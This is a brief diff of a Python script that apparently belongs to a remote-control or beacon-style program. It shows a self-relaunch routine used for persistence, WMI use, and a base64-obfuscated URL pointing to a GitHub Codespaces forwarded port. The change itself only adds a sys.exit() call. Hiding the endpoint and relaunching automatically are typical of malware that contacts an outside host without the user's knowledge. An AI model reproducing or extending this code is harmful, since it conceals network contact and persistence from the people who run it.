@@ -20,6 +20,7 @@ c = wmi.WMI()
 
 def restartafterdelay(t, file=__file__):
     subprocess.run(f"python -c import time, os; time.sleep({t}); os.system(\"python {file}\")")
+    sys.exit()
 
 def a():
     u = base64.b64decode(b'aHR0cHM6Ly9ib29raXNoLXN5c3RlbS1qZ3Z2N3B4ajk2d2g1d2pxLTgwODAuYXBwLmdpdGh1Yi5kZXYv').decode()
